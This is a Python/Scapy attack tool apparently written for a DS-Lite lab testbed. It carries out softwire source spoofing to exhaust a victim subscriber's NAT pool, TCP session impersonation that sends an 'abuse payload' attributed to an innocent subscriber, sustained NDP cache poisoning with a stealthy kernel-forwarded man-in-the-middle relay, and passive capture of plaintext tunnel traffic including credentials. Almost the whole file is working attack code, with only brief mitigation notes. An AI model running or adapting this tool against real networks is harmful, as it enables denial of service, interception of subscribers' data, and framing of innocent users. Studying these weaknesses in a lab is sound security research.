#!/usr/bin/python
# T3 – Softwire Endpoint Spoofing & On-Path MITM (poison both endpoints, relay)
# T4 – Unencrypted Tunnel Traffic Interception (read the softwire plaintext)
#
# DS-Lite relies on the B4's IPv6 source address (Softwire-ID) to identify
# subscribers. There is NO cryptographic authentication of this address.
# An attacker within the IPv6 ISP network can:
#
#   T3 (spoof): Forge packets with a victim B4's IPv6 source address,
#      causing AFTR to attribute attacker traffic to the victim subscriber.
#      Use cases: traffic misdirection, attribution evasion, service theft.
#
#   T4 (sniff): Capture all IPv6 softwire traffic on the ISP L2 segment.
#      Since tunnels are unencrypted, the attacker sees all IPv4 content
#      encapsulated inside IPv6 packets between B4 and AFTR.
#
# Attacker position: ISP network (2001:db8:cafe::/64)
#
# Usage:
#   # T3 – spoof B4-1's identity, inject TCP traffic:
#   python3 tunnel_spoof.py spoof --interface eth-isp \
#       --src-ip6 2001:db8:cafe::150 --victim-b4-ip6 <B4-1-IPv6> \
#       --aftr-ip6 2001:db8:cafe::10 \
#       --inner-src-ip4 10.0.1.50 --inner-dst-ip4 198.51.100.2 \
#       --proto tcp --count 20
#
#   # T4 – passive sniff of all softwire traffic:
#   python3 tunnel_spoof.py sniff --interface eth-isp \
#       --aftr-ip6 2001:db8:cafe::10 --output-pcap /tmp/softwire.pcap
import argparse
import random
import signal
import sys
import os
import threading
import time

def _sigterm_handler(signum, frame):
    raise KeyboardInterrupt()
signal.signal(signal.SIGTERM, _sigterm_handler)

from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.inet6 import IPv6, ICMPv6ND_NS
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, srp1, sniff
from scapy.utils import wrpcap

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
from validate_parameters import is_valid_ipv4, is_valid_ipv6

stop_event = threading.Event()
captured_pkts = []
capture_lock = threading.Lock()


# ── NDP resolution ────────────────────────────────────────────────────────

def ndp_resolve(iface, target_ip6, src_ip6=None):
    """Resolve IPv6 → MAC via Neighbor Discovery."""
    try:
        from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
        ns = (
            Ether(dst="33:33:ff:00:00:10") /
            IPv6(dst=target_ip6) /
            ICMPv6ND_NS(tgt=target_ip6)
        )
        if src_ip6:
            ns[IPv6].src = src_ip6
        ans = srp1(ns, iface=iface, timeout=3, verbose=0)
        if ans and ans.haslayer(Ether):
            return ans[Ether].src
    except Exception:
        pass
    return "ff:ff:ff:ff:ff:ff"  # fallback: broadcast


# ── T3: SPOOF MODE ────────────────────────────────────────────────────────

def build_spoofed_pkt(src_ip6, victim_b4_ip6, aftr_ip6,
                      inner_src4, inner_dst4, proto, sport, dport, dmac):
    """
    Build a 4-in-6 packet with:
      Outer IPv6 src = victim_b4_ip6  (spoofed Softwire-ID)
      Outer IPv6 dst = aftr_ip6
      Inner IPv4 = legitimate-looking traffic attributed to victim
    """
    outer = (
        Ether(dst=dmac) /
        IPv6(src=victim_b4_ip6, dst=aftr_ip6, nh=4)  # nh=4: IPv4-in-IPv6
    )
    if proto == 'tcp':
        inner = (
            IP(src=inner_src4, dst=inner_dst4, ttl=63,
               id=random.randint(0, 65535), flags='DF') /
            TCP(sport=sport, dport=dport, flags='S')
        )
    elif proto == 'udp':
        inner = (
            IP(src=inner_src4, dst=inner_dst4, ttl=63,
               id=random.randint(0, 65535), flags='DF') /
            UDP(sport=sport, dport=dport) /
            b'SPOOF-TEST'
        )
    else:
        inner = (
            IP(src=inner_src4, dst=inner_dst4, ttl=63,
               id=random.randint(0, 65535), flags='DF') /
            ICMP(type=8, code=0)
        )
    return outer / inner


def run_spoof(args):
    """T3: Send spoofed 4-in-6 packets impersonating victim B4.

    Impact: attacker's traffic consumes victim B4's NAT port pool.
    Once the pool is exhausted, the real victim cannot create new
    connections — effective denial of service via identity theft.
    """
    iface = args.interface
    import random
    import struct
    from scapy.sendrecv import sendp as _sendp

    # ── Reconnaissance: discover a victim B4 if none was supplied ──────────
    # The attack needs a victim B4 outer-IPv6 to impersonate. Rather than
    # require it in advance, run the carrier recon ladder (passive sniff ->
    # predictable guess -> active NDP probe) to find one.
    if args.discover or not args.victim_b4_ip6:
        import os as _os, sys as _sys
        _sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
        try:
            import recon as _recon
            r = _recon.discover(iface, args.src_ip6, args.aftr_ip6,
                                passive_timeout=args.recon_timeout)
        except Exception as e:
            print(f"[!] recon failed: {e}")
            r = None
        if not r:
            print("[!] No victim B4 discovered. Supply --victim-b4-ip6 explicitly.")
            return 1
        args.victim_b4_ip6 = r["victim_b4"]
        args.aftr_ip6 = r.get("aftr") or args.aftr_ip6
        print(f"[*] Recon picked victim B4 {args.victim_b4_ip6} "
              f"(AFTR {args.aftr_ip6}) via {r['method']}")

    inner_parts = args.inner_src_ip4.split('.')
    inner_base = '.'.join(inner_parts[:3]) + '.'

    print()
    print("=" * 64)
    print("  T3 – Softwire Endpoint Spoofing & On-Path MITM (Softwire-ID Forgery)")
    print("=" * 64)
    print()
    print("  Scenario")
    print("  --------")
    print(f"  Attacker:    ISP network node ({args.src_ip6})")
    print(f"  Victim:      B4 subscriber    ({args.victim_b4_ip6})")
    print(f"               Clients behind victim use {inner_base}0/24")
    print(f"  Target:      AFTR             ({args.aftr_ip6})")
    print(f"  Server:      {args.inner_dst_ip4}")
    print()
    print("  What this attack does")
    print("  ---------------------")
    print("  The attacker forges IPv6 tunnel packets with the victim's")
    print("  B4 IPv6 address as the outer source.  The AFTR has no way")
    print("  to verify this (DS-Lite has no tunnel authentication) and")
    print("  accepts the packets as if they came from the real victim.")
    print()
    print("  Each spoofed packet creates a NAT binding in the victim's")
    print("  port pool.  Once the pool / conntrack table is full, the")
    print("  real subscriber (Client1) cannot create new connections.")
    print()
    print("  Packet flow")
    print("  -----------")
    print(f"  Attacker --[IPv6 src={args.victim_b4_ip6} (SPOOFED)]-->")
    print(f"    AFTR decapsulates, sees inner {inner_base}X -> {args.inner_dst_ip4}")
    print(f"    AFTR NATs using victim's pool, logs victim as source")
    print(f"    Victim's conntrack fills -> Client1 connectivity LOST")
    print()
    print("-" * 64)

    # Resolve AFTR MAC
    print(f"[*] Resolving AFTR MAC via NDP ...")
    dmac = ndp_resolve(iface, args.aftr_ip6, args.src_ip6)
    print(f"[*] AFTR MAC: {dmac}")
    print()

    # Build batches of spoofed packets — each with a unique inner-src-IP
    # and random ports to create maximum distinct NAT bindings.
    # Uses the victim's inner IPv4 subnet (e.g. 10.0.1.0/24) as source
    # range so AFTR routes them through the victim's tunnel/pool.
    dst_ports = [80, 443, 8080, 22, 8443, 993, 995, 25, 110]
    batch_size = args.batch

    # Parse inner src as base network for randomization
    inner_parts = args.inner_src_ip4.split('.')
    inner_base = '.'.join(inner_parts[:3]) + '.'  # e.g. "10.0.1."

    sent = 0
    count = args.count if args.count else float('inf')
    t0 = time.time()

    print(f"[*] Flooding victim's NAT pool... Ctrl+C to stop.")
    print(f"[*] Inner src range: {inner_base}2-254 (random per packet)")
    print(f"[*] Each packet creates a NAT binding attributed to victim B4.")
    print()

    try:
        while sent < count and not stop_event.is_set():
            # Build a batch of packets with unique 5-tuples
            batch = []
            for _ in range(batch_size):
                if getattr(args, 'focused', False):
                    # Focused impersonation: ONE identifiable forged flow to a
                    # fixed (open) dst port, so the demo shows the AFTR attributing
                    # it to the victim and the REPLY returning to the victim B4 -
                    # not an exhaustion-style flood of random 5-tuples.
                    sport = args.focus_sport
                    dport = args.dst_port
                    inner_src = args.inner_src_ip4
                else:
                    sport = random.randint(1025, 65000)
                    dport = random.choice(dst_ports)
                    inner_src = inner_base + str(random.randint(2, 254))
                pkt = build_spoofed_pkt(
                    args.src_ip6, args.victim_b4_ip6, args.aftr_ip6,
                    inner_src, args.inner_dst_ip4,
                    args.proto, sport, dport, dmac
                )
                batch.append(pkt)

            _sendp(batch, iface=iface, verbose=0)
            sent += len(batch)

            elapsed = time.time() - t0
            rate = int(sent / elapsed) if elapsed > 0 else 0
            print(f"\r  [*] Sent: {sent:,}  Rate: {rate} pkt/s  "
                  f"(victim={args.victim_b4_ip6})", end='', flush=True)

            if args.interval:
                time.sleep(args.interval)
    except KeyboardInterrupt:
        pass

    elapsed = time.time() - t0
    print(f"\n\n[+] Sent {sent:,} spoofed softwire packets in {elapsed:.1f}s")
    print()
    print("Impact on victim (Client1):")
    print("  - Attacker's flows consumed victim B4's NAT port pool")
    print("  - AFTR attributed all traffic to victim's Softwire-ID")
    print("  - Victim cannot create new outbound connections (pool full)")
    print("  - AFTR logs show victim B4 IPv6 as the source subscriber")
    print()
    print("Verify:")
    print("  AFTR:    conntrack -L | grep 10.0.1.50 | wc -l")
    print("  Client1: curl http://198.51.100.2  (should fail/timeout)")


# ── T4: SNIFF MODE ────────────────────────────────────────────────────────

def _extract_inner_ip(pkt):
    """Extract inner IPv4 from a softwire packet, handling both raw (nh=4)
    and ip6tnl DSTOPT-wrapped (nh=60→nh=4) encapsulation.

    Scapy may not bind IPv6ExtHdrDestOpt→IP, so we fall back to manual
    byte-level parsing when haslayer(IP) returns False.
    """
    ipv6 = pkt[IPv6]

    # Fast path: Scapy already dissected the inner IP layer
    if pkt.haslayer(IP):
        # Verify it's actually encapsulated (not a coincidental outer IP header)
        # by checking that it comes after the IPv6 layer in the stack
        candidate = pkt[IP]
        if candidate.underlayer is not None and not candidate.underlayer.haslayer(IPv6):
            pass  # outer IP — fall through to manual parse
        else:
            return candidate

    # Manual fallback: parse raw bytes after IPv6 (and optional DSTOPT) header
    # IPv6 header is always exactly 40 bytes
    raw_after_ipv6 = bytes(ipv6)[40:]
    if not raw_after_ipv6:
        return None

    if ipv6.nh == 4:
        # Raw IPv4-in-IPv6: inner IPv4 starts immediately
        raw_inner = raw_after_ipv6
    elif ipv6.nh == 60:
        # Destination Options extension header precedes inner IPv4
        # DSTOPT format: 1 byte nh, 1 byte hdr_ext_len, then options/padding
        # Total size = (hdr_ext_len + 1) * 8 bytes
        if len(raw_after_ipv6) < 2:
            return None
        hdr_ext_len = raw_after_ipv6[1]
        dstopt_size = (hdr_ext_len + 1) * 8
        if len(raw_after_ipv6) <= dstopt_size:
            return None
        raw_inner = raw_after_ipv6[dstopt_size:]
    else:
        return None

    try:
        return IP(raw_inner)
    except Exception:
        return None


def packet_handler(pkt):
    """Extract and display inner IPv4 from softwire (4-in-6) packets.

    ip6tnl wraps with a Destination Options extension header (nh=60→nh=4).
    We use _extract_inner_ip() which handles both raw encap (nh=4, used by
    our spoof tool) and DSTOPT-wrapped (nh=60, used by ip6tnl/B4 kernel).
    """
    if not pkt.haslayer(IPv6):
        return
    ipv6 = pkt[IPv6]
    # Accept nh=4 (raw encap) or nh=60 (DSTOPT, used by ip6tnl)
    if ipv6.nh not in (4, 60):
        return

    inner_ip = _extract_inner_ip(pkt)
    if inner_ip is None:
        return
    proto_name = {6: 'TCP', 17: 'UDP', 1: 'ICMP'}.get(inner_ip.proto, str(inner_ip.proto))

    sport = dport = '?'
    if inner_ip.haslayer(TCP):
        sport = inner_ip[TCP].sport
        dport = inner_ip[TCP].dport
        flags = inner_ip[TCP].flags
        extra = f" flags={flags}"
    elif inner_ip.haslayer(UDP):
        sport = inner_ip[UDP].sport
        dport = inner_ip[UDP].dport
        extra = ""
    elif inner_ip.haslayer(ICMP):
        extra = f" type={inner_ip[ICMP].type}"
    else:
        extra = ""

    ts = time.strftime('%H:%M:%S')
    print(f"  [{ts}] SOFTWIRE  "
          f"{ipv6.src} → {ipv6.dst}  |  "
          f"INNER: {inner_ip.src}:{sport} → {inner_ip.dst}:{dport}  "
          f"{proto_name}{extra}")

    with capture_lock:
        captured_pkts.append(pkt)


def run_sniff(args):
    """T4: Passive capture of all 4-in-6 softwire traffic."""
    iface = args.interface
    # Capture both directions: B4→AFTR (subscriber traffic) and AFTR→B4 (server replies)
    # ip6tnl uses Destination Options header (proto 60) so we filter by host, not proto 4
    if args.aftr_ip6:
        aftr_filter = f'ip6 and (host {args.aftr_ip6})'
    else:
        aftr_filter = 'ip6'

    print()
    print("=" * 64)
    print("  T4 – Unencrypted Tunnel Traffic Interception")
    print("=" * 64)
    print()
    print("  Scenario")
    print("  --------")
    print(f"  Attacker:    ISP network observer ({iface})")
    print(f"  Victims:     All B4 subscribers on the ISP segment")
    print(f"  AFTR:        {args.aftr_ip6 or '(any)'}")
    print()
    print("  What this attack does")
    print("  ---------------------")
    print("  DS-Lite tunnels (IPv4-in-IPv6) carry subscriber traffic in")
    print("  plaintext — RFC 6333 does not mandate encryption.  Any node")
    print("  on the ISP L2 segment between B4 and AFTR can passively")
    print("  capture all encapsulated IPv4 traffic: HTTP, DNS, credentials,")
    print("  session cookies, and any other unencrypted application data.")
    print()
    print("  Packet flow")
    print("  -----------")
    print(f"  B4 --[IPv6 tunnel (plaintext IPv4 inside)]--> AFTR")
    print(f"  Attacker on same L2 segment sees ALL tunnel packets")
    print(f"  Outer IPv6 headers reveal subscriber identity (Softwire-ID)")
    print(f"  Inner IPv4 headers reveal destination, ports, payload")
    print()
    print("  Privacy impact")
    print("  --------------")
    print("  - Subscriber browsing history (DNS queries, HTTP hosts)")
    print("  - Credentials sent over unencrypted protocols")
    print("  - Traffic patterns and subscriber activity profiling")
    print("  - Correlation of IPv6 identity to IPv4 activity")
    print()
    print("-" * 64)
    print(f"  Interface:  {iface}")
    print(f"  BPF filter: {aftr_filter}")
    if args.output_pcap:
        print(f"  Output:     {args.output_pcap}")
    if args.duration:
        print(f"  Duration:   {args.duration}s")
    print("-" * 64)
    print()
    print("[*] Sniffing IPv6 softwire traffic... Ctrl+C to stop.")
    print()
    print(f"  {'Time':<10} {'Outer IPv6 (Softwire)':<50} {'Inner IPv4 flow'}")
    print("  " + "-" * 100)

    duration = args.duration if args.duration else None
    try:
        sniff(
            iface=iface,
            filter=aftr_filter,
            prn=packet_handler,
            store=False,
            timeout=duration
        )
    except KeyboardInterrupt:
        pass

    print()
    with capture_lock:
        count = len(captured_pkts)
        pkts = list(captured_pkts)

    print(f"[+] Captured {count} softwire packets")
    if args.output_pcap:
        print(f"[!] Confirm content: tcpdump -r {args.output_pcap} -nA | head -40")

    if args.output_pcap and pkts:
        try:
            wrpcap(args.output_pcap, pkts)
            print(f"[+] Saved to {args.output_pcap}")
        except Exception as e:
            print(f"[!] Could not write pcap: {e}")

    print()
    print("=" * 64)
    print("  Capture Summary")
    print("=" * 64)
    print(f"  Packets captured:  {count}")
    if args.output_pcap and pkts:
        print(f"  Saved to:          {args.output_pcap}")
    print()
    print("  What was exposed")
    print("  ----------------")
    print("  - All subscriber IPv4 traffic visible in plaintext")
    print("  - Outer IPv6 headers reveal each subscriber's identity")
    print("  - Inner IPv4 shows destinations, ports, and payload data")
    print("  - No encryption mandated by DS-Lite (RFC 6333)")
    print()
    print("  Mitigation")
    print("  ----------")
    print("  - IPsec ESP on softwire tunnels (RFC 6333 §11)")
    print("  - TLS/HTTPS for all application-layer traffic")
    print("  - L2 segment isolation (prevent attacker ISP placement)")


# ── T3 (developed): full bidirectional session impersonation ────────────────
# The plain spoof only injects one-way traffic. On the shared carrier segment the
# attacker also SEES the AFTR's de-NAT'd reply toward the victim B4 (it is sent to
# ::b4N on the same L2). So the attacker can run a complete raw TCP state machine
# AS the victim: forge ::b4N to send, sniff the AFTR->::b4N return to receive.
#
# This turns identity forgery into a weapon:
#   * the session is fully ESTABLISHED and attributed to the VICTIM at the AFTR
#     (victim's conntrack zone/mark, victim's share of the public IPv4);
#   * any payload the attacker pushes (here an HTTP request that doubles as the
#     abuse pattern) is logged by the operator's per-binding attribution
#     (RFC 6333 11) against the INNOCENT victim -- T3 frames a specific
#     subscriber, where T2 only taints the whole shared pool.
def run_impersonate(args):
    """T3-impersonate: open a real bidirectional TCP session AS the victim B4,
    then push attacker payload over it (attributed to the victim)."""
    import struct as _struct
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    # Reuse nat_hold's raw 4-in-6 TCP engine (single source of truth).
    from nat import nat_hold as _nh

    iface, victim = args.interface, args.victim_b4_ip6
    aftr, dst4 = args.aftr_ip6, args.inner_dst_ip4
    inner4 = args.inner_src_ip4
    dport = args.target_port
    sport = random.randint(1025, 65533)
    seq = random.randint(1, 0xFFFFFFFE)

    print("\n" + "=" * 64)
    print("  T3-IMPERSONATE - bidirectional session as the victim B4")
    print("=" * 64)
    print(f"  forging victim {victim}  ->  AFTR {aftr}")
    print(f"  session: inner {inner4}:{sport} -> {dst4}:{dport}  (as the victim)")

    dmac = _nh._resolve_mac_ndp(iface, aftr) or "ff:ff:ff:ff:ff:ff"
    sock = _nh._open_raw_sock(iface)

    # Receiver: dispatch AFTR->victim SYN-ACK (and later data) for our flow.
    q = _nh.Queue(maxsize=8)
    with _nh._synack_map_lock:
        _nh._synack_map[(inner4, sport)] = q
    stop_ev = threading.Event()
    rx = threading.Thread(target=_nh.receiver_thread, args=(iface, aftr, stop_ev), daemon=True)
    rx.start()
    time.sleep(0.3)

    # 1. SYN (as victim)
    sock.send(_nh._build_syn(victim, aftr, inner4, dst4, sport, dport, seq, dmac))
    print("  [1/3] SYN sent as victim; sniffing AFTR's reply toward the victim ...")

    # 2. sniff SYN-ACK from the AFTR's de-NAT'd return path
    try:
        server_seq, _ = q.get(timeout=6)
    except Exception:
        print("  [!] no SYN-ACK captured (victim idle / wrong segment / SAVI on)")
        stop_ev.set(); return 1
    ack = (server_seq + 1) & 0xFFFFFFFF
    seq = (seq + 1) & 0xFFFFFFFF
    print(f"  [2/3] SYN-ACK CAPTURED (server_seq={server_seq}) -> bidirectional channel up")

    # 3. ACK + push the abuse payload (HTTP request that frames the victim)
    sock.send(_nh._build_ack(victim, aftr, inner4, dst4, sport, dport, seq, ack, dmac))
    payload = (f"GET /{args.abuse_path} HTTP/1.1\r\nHost: {dst4}\r\n"
               f"User-Agent: abuse-as-victim\r\nConnection: close\r\n\r\n").encode()
    psh = _build_psh(victim, aftr, inner4, dst4, sport, dport, seq, ack, payload, dmac)
    sock.send(psh)
    print(f"  [3/3] ESTABLISHED as victim; pushed {len(payload)}B abuse payload "
          f"(GET /{args.abuse_path})")
    print("  *** session + abuse now attributed to the VICTIM at the AFTR ***")
    print(f"  Verify: conntrack -L | grep {inner4}   (zone-orig = victim B4)")
    print(f"          tail /var/log/aftr-bindings.log  (frames the victim)")
    time.sleep(1.0)
    stop_ev.set()
    return 0


def _build_psh(src_ip6, aftr_ip6, inner4, dst4, sport, dport, seq, ack, data, dmac):
    """4-in-6 TCP PSH+ACK carrying `data` (attacker payload as the victim)."""
    pkt = (Ether(dst=dmac) /
           IPv6(src=src_ip6, dst=aftr_ip6, nh=4) /
           IP(src=inner4, dst=dst4, ttl=63) /
           TCP(sport=sport, dport=dport, flags='PA', seq=seq, ack=ack, window=65535) /
           data)
    return bytes(pkt)


# ── T3 (developed): true MITM via sustained NDP cache poisoning ──────────────
# The AFTR reaches a victim B4 (::b4N) by L2-resolving it via NDP on the carrier
# segment. RFC 4861 7.2.5 lets an *override* Neighbor Advertisement update that
# cache entry. A single poison is reverted by NUD when the real B4 answers the
# AFTR's re-validation - so we flood override NAs continuously, winning the race
# and HOLDING the AFTR's cache pointing ::b4N -> attacker MAC.
#
# Effect (verified): the AFTR's de-NAT'd return traffic for the victim is now
# delivered to the ATTACKER, not the real B4. The attacker is on-path for the
# inbound direction; combined with T3 forge-to-send (outbound), that is full
# bidirectional MITM. The real B4 is cut out, so the victim also loses
# connectivity (a DoS side effect) and there is no RST race.
#
# Defenses that stop it: L2 subscriber isolation on the access network (the
# attacker cannot share the B4's segment), NDP/RA guard or SAVI (drop the spoofed
# NA), static neighbor entries, and IPsec on the softwire (intercepted traffic
# stays unreadable even if redirected).
def _own_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip()
    except Exception:
        return None


def run_mitm(args):
    """T3-mitm: hold the AFTR's NDP cache for the victim B4 via sustained override
    NAs, intercepting the AFTR's return traffic (true MITM + victim DoS)."""
    from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
    from scapy.sendrecv import sendp as _sendp
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from nat import nat_hold as _nh

    iface, victim, aftr = args.interface, args.victim_b4_ip6, args.aftr_ip6
    amac = _own_mac(iface)
    if not amac:
        print(f"[!] cannot read own MAC for {iface}"); return 1
    aftrmac = _nh._resolve_mac_ndp(iface, aftr)
    if not aftrmac:
        print(f"[!] could not NDP-resolve the AFTR ({aftr}); is it reachable?"); return 1

    print("\n" + "=" * 64)
    print("  T3-MITM - sustained NDP poison -> AFTR return-path interception")
    print("=" * 64)
    print(f"  victim B4 {victim}  |  AFTR {aftr} ({aftrmac})  |  attacker MAC {amac}")
    print(f"  flooding override NAs (::b4N -> attacker) for {args.duration}s ...")
    print("  -> AFTR replies for the victim now arrive at the attacker;")
    print("     the real B4 is cut out (victim loses connectivity).")

    poison = (Ether(src=amac, dst=aftrmac) /
              IPv6(src=victim, dst=aftr, hlim=255) /
              ICMPv6ND_NA(tgt=victim, R=1, S=1, O=1) /
              ICMPv6NDOptDstLLAddr(lladdr=amac))
    praw = bytes(poison)
    sock = _nh._open_raw_sock(iface)

    # Optional: capture the now-intercepted return traffic in a side thread.
    intercepted = {"n": 0}
    stop_ev = threading.Event()
    if args.show_intercept:
        def _tap():
            rs = _nh._open_raw_sock(iface)
            rs.settimeout(0.5)
            abytes = _nh._ipv6_to_bytes(aftr)
            while not stop_ev.is_set():
                try:
                    raw = rs.recv(65535)
                except Exception:
                    continue
                # AFTR-sourced softwire frame now addressed to US (our MAC)
                if len(raw) < 54 or raw[0:6] != bytes.fromhex(amac.replace(":", "")):
                    continue
                if raw[22:38] == abytes and raw[20] == 4:
                    intercepted["n"] += 1
        threading.Thread(target=_tap, daemon=True).start()

    import time as _t
    t0 = _t.time()
    sent = 0
    try:
        while _t.time() - t0 < args.duration:
            sock.send(praw); sent += 1
            _t.sleep(args.interval)
    except KeyboardInterrupt:
        pass
    stop_ev.set()
    print(f"\n  [+] held the poison for {args.duration}s ({sent} NAs flooded)")
    if args.show_intercept:
        print(f"  [+] intercepted {intercepted['n']} AFTR->victim return frames "
              f"(delivered to the attacker, not the real B4)")
    print(f"  Verify: ip netns exec aftr ip -6 neigh show | grep {victim}")
    print(f"          (lladdr = attacker MAC while the flood runs)")
    print("  Stop the flood and the cache reverts (NUD) - victim recovers.")
    return 0


def run_relay(args):
    """T3 softwire MITM (positioning + relay ONLY - reading is T4): poison both
    neighbour caches so the AFTR believes the attacker is the B4 and the B4
    believes the attacker is the AFTR, then forward in the middle.

      upstream   B4 --(::b41 > ::10)--> [poisoned: goes to attacker] --> real AFTR
      downstream AFTR --(::10 > ::b41)--> [poisoned: goes to attacker] --> real B4

    This mode only PLACES the attacker on-path and keeps the victim served; it
    does NOT inspect payloads. To READ the intercepted plaintext, run the T4
    `sniff` mode alongside it (the unencrypted-tunnel interception attack). The
    MITM is what gives an attacker on a SWITCHED segment the access that T4
    otherwise only has on a shared/flooding segment; it also enables active
    tampering (drop / redirect / modify), which passive T4 cannot do.

    TWO forwarders:
      --kernel  (RECOMMENDED): the attacker's KERNEL forwards at line rate.
                Verified STABLE in this testbed - 80/80 sessions stayed HTTP 200
                with every return frame transiting the attacker (0 bypass). A
                true transparent MITM: the victim works yet all its traffic
                flows through us.
      default   (userspace re-inject): kept for reference, but it is LOSSY and
                only manages a DoS, not a clean relay - prefer --kernel.

    Enabling conditions: on-path L2 adjacency on the carrier segment, no SAVI /
    RA-guard / NDP inspection, no softwire authentication (RFC 6333 has none),
    and an existing neighbour entry to override (any active subscriber). It is
    transient - stop the flood and NUD reverts the caches, victim recovers.
    """
    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from nat import nat_hold as _nh
    from scapy.layers.inet6 import ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
    import time as _t

    iface  = args.interface
    aftr   = args.aftr_ip6          # ::10
    victim = args.victim_b4_ip6     # ::b41
    amac   = _own_mac(iface)
    if not amac:
        print(f"[!] cannot read own MAC for {iface}"); return 1
    aftrmac = _nh._resolve_mac_ndp(iface, aftr)
    b4mac   = _nh._resolve_mac_ndp(iface, victim)
    if not aftrmac or not b4mac:
        print(f"[!] could not resolve AFTR ({aftrmac}) / B4 ({b4mac}) MAC"); return 1

    amac_b    = bytes.fromhex(amac.replace(':', ''))
    aftrmac_b = bytes.fromhex(aftrmac.replace(':', ''))
    b4mac_b   = bytes.fromhex(b4mac.replace(':', ''))
    aftr_ip_b   = _nh._ipv6_to_bytes(aftr)
    victim_ip_b = _nh._ipv6_to_bytes(victim)

    # override NA mapping `tgt` -> attacker, L2-addressed to `to_mac`
    def _na(tgt, peer, to_mac):
        return bytes(Ether(src=amac, dst=to_mac) /
                     IPv6(src=tgt, dst=peer, hlim=255) /
                     ICMPv6ND_NA(tgt=tgt, R=1, S=1, O=1) /
                     ICMPv6NDOptDstLLAddr(lladdr=amac))
    poison_aftr = _na(victim, aftr, aftrmac)  # AFTR: ::b41 -> us
    poison_b4   = _na(aftr, victim, b4mac)    # B4:   ::10  -> us

    print("\n" + "=" * 64)
    print("  T3-RELAY - full softwire MITM (poison both ways + forward)")
    print("=" * 64)
    print(f"  victim B4 {victim} ({b4mac})  |  AFTR {aftr} ({aftrmac})")
    print(f"  attacker {amac}  -- relaying for {args.duration}s ...")

    # ── KERNEL-forward MITM (verified stable: 80/80 sessions, 0 bypass) ──────
    # Poison both neighbour caches AND let the attacker's KERNEL relay the
    # softwire frames at line rate. This avoids the lossy userspace relay that
    # only managed a DoS. The attacker keeps its OWN correct view via static
    # neighbours (::b41 -> real B4, ::10 -> real AFTR) so it forwards each frame
    # on. The victim stays fully served (HTTP 200) while we read/relay it all.
    #   Pre-req: the AFTR/B4 must already have a neighbour entry for the peer
    #   (true for any active subscriber); an override NA updates but cannot
    #   create one (RFC 4861 s7.2.5, accept_untracked_na=0).
    if getattr(args, 'kernel', False):
        import subprocess as _sp
        def _run(c): _sp.call(c, shell=True,
                              stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
        _run("sysctl -qw net.ipv6.conf.all.forwarding=1")
        _run(f"sysctl -qw net.ipv6.conf.{iface}.forwarding=1")
        _run(f"ip -6 neigh replace {victim} lladdr {b4mac} nud permanent dev {iface}")
        _run(f"ip -6 neigh replace {aftr} lladdr {aftrmac} nud permanent dev {iface}")
        # Stay quiet: forwarding back out the same segment makes the kernel emit
        # ICMPv6 redirects (noise that also tips off / un-poisons the endpoints).
        # There is no IPv6 send_redirects sysctl, so drop them on egress.
        _run("nft add table ip6 mitmquiet")
        _run("nft add chain ip6 mitmquiet out "
             "'{ type filter hook output priority 0; policy accept; }'")
        _run("nft add rule ip6 mitmquiet out icmpv6 type nd-redirect drop")
        # A REACHABLE neighbour entry holds for ~30s, so a slow refresh keeps the
        # poison without flooding. Cap the rate so we do not spew override NAs.
        na_interval = max(args.interval, 0.5)
        print("  [mode] kernel-forward: forwarding=1 + static neighbours installed")
        print(f"         relaying at line rate; refreshing the poison every "
              f"{na_interval}s; ICMPv6 redirects suppressed")
        sock_k = _nh._open_raw_sock(iface)
        t0 = _t.time()
        sent = 0
        try:
            while _t.time() - t0 < args.duration:
                sock_k.send(poison_aftr); sock_k.send(poison_b4); sent += 2
                _t.sleep(na_interval)
        except KeyboardInterrupt:
            pass
        finally:                                   # clean teardown
            _run("sysctl -qw net.ipv6.conf.all.forwarding=0")
            _run(f"ip -6 neigh del {victim} dev {iface}")
            _run(f"ip -6 neigh del {aftr} dev {iface}")
            _run("nft delete table ip6 mitmquiet")
        print(f"\n  [+] held the MITM for {args.duration}s ({sent} override NAs)")
        print("  victim stayed served while every frame transited the attacker.")
        print("  To READ the intercepted plaintext, run the T4 `sniff` mode now")
        print("  (the MITM only positions+relays; reading the softwire is T4).")
        print("  Stop and the caches revert (NUD) - victim continues normally.")
        return 0

    sock_rx = _nh._open_raw_sock(iface)
    # Big RX buffer so bursts of return frames are not dropped while we forward.
    try:
        import socket as _s
        sock_rx.setsockopt(_s.SOL_SOCKET, _s.SO_RCVBUF, 8 * 1024 * 1024)
    except Exception:
        pass
    sock_rx.settimeout(0.3)
    sock_tx = _nh._open_raw_sock(iface)
    stop_ev = threading.Event()

    down_only = getattr(args, 'down_only', False)
    def _poison():
        while not stop_ev.is_set():
            try:
                sock_tx.send(poison_aftr)             # AFTR return path -> us
                if not down_only:
                    sock_tx.send(poison_b4)           # B4 upstream path -> us
            except Exception:
                pass
            _t.sleep(args.interval)
    threading.Thread(target=_poison, daemon=True).start()
    if down_only:
        print("  [mode] down-only: upstream left native, relaying the return path")

    up = down = 0
    t0 = _t.time()
    try:
        while _t.time() - t0 < args.duration:
            try:
                raw = sock_rx.recv(65535)
            except Exception:
                continue
            # only frames the AFTR/B4 sent to US because of the poison
            if len(raw) < 54 or raw[0:6] != amac_b or raw[12:14] != b'\x86\xdd':
                continue
            src, dst = raw[22:38], raw[38:54]
            if src == aftr_ip_b and dst == victim_ip_b:
                sock_tx.send(b4mac_b + amac_b + raw[12:]); down += 1   # -> real B4
            elif src == victim_ip_b and dst == aftr_ip_b and not down_only:
                sock_tx.send(aftrmac_b + amac_b + raw[12:]); up += 1   # -> real AFTR
            else:
                continue
    except KeyboardInterrupt:
        pass
    stop_ev.set()

    # T3 is the MITM (positioning + relay) ONLY. Reading the now-intercepted
    # plaintext is the T4 attack - run `tunnel_spoof.py sniff` to do that.
    print(f"\n  [+] relayed {up} upstream + {down} downstream softwire frames")
